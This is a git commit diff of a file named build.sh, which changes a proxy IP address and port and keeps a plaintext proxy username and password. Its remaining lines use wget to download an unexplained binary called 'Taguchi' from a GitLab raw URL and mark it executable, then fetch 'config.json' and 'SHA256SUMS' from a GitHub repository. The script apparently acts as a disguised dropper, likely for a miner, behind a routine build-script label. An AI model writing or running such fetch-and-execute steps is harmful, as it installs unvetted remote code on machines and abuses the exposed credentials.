19c0cfeff6b272ee684f3172770a5745cccc18ae
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-05 12:13:04 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,7 +1,7 @@
-proxy="154.95.36.199" 
-port="6893" 
+proxy="45.94.47.66" 
+port="8110" 
 user="ubslvwxe"  
-pass="iikj33112te4" 
+pass="iikj33112te4"  
 wget -q -O Taguchi https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x Taguchi
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
